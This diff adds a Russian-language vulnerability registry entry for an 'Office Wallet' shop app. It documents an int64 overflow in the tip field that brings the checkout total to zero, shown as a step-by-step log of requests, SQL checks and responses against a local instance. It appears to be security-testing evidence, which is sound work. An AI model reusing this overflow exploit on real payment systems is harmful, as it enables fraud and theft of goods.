@@ -1,0 +1,26 @@
+OFFICE WALLET · АРТЕФАКТ ПО РЕЕСТРУ
+################################################################################################
+# OW-01
+################################################################################################
+== 7. OW-01: переполнение чаевых — покупка за 0 рублей ==
+    · tip_kop берётся из формы ParseInt без проверки на переполнение, а дальше
+    · chargeKop = сумма + чаевые (handlers_shop.go:190-196). max int64 в сумме
+    · переполняет int64 в минус, проверка chargeKop < 0 обнуляет результат —
+    · котировка становится 0, и товар уходит бесплатно.
+    → SQL DELETE FROM cart_items WHERE user_id=1
+    ← psql DELETE 0
+    → POST /cart/add  product_id=3 (SNACK 270₽)
+    ← HTTP 302 redirect=http://localhost:18081/cart  <!DOCTYPE html> <html lang="ru"> <head>   <meta charset="utf-8">   <meta name="viewport" content="width=device-width, initial-scale=1">   <title>Корзина · Office Wallet</title>   <link rel="preconnect" href="https://fonts.googleapis.com"> ...
+    → POST /checkout/quote  tip_kop=9223372036854775807 (max int64)
+    ← HTTP 200  <!DOCTYPE html> <html lang="ru"> <head>   <meta charset="utf-8">   <meta name="viewport" content="width=device-width, initial-scale=1">   <title>Подтверждение оплаты · Office Wallet</title>   <link rel="preconnect" href="https://fonts.goog...
+    → SQL SELECT id||'|'||total_kop||'|'||tip_kop FROM checkout_quotes ORDER BY id DESC LIMIT 1;
+    ← psql 151|0|9223372036854775807
+    → POST /checkout/confirm  quote_id=151 (оплата по котировке 0)
+    ← HTTP 302 redirect=http://localhost:18081/orders/207  <!DOCTYPE html> <html lang="ru"> <head>   <meta charset="utf-8">   <meta name="viewport" content="width=device-width, initial-scale=1">   <title>Заказ · Office Wallet</title>   <link rel="preconnect" href="https://fonts.googleapis.com">   ...
+    → SQL SELECT id||'|'||total_kop FROM orders ORDER BY id DESC LIMIT 1;
+    ← psql 207|0
+    ┌─ АРТЕФАКТ · OW-01 · переполнение tip_kop
+    │ строка checkout_quotes: id|total_kop|tip_kop = см. SQL выше
+    │ заказ в БД: 207|0; баланс: 1942339,00 → 1942339,00 руб.
+    └─
+[+] заказ #207 оформлен с total=0, баланс не изменился (1942339,00 -> 1942339,00 руб.) — товар ушёл даром
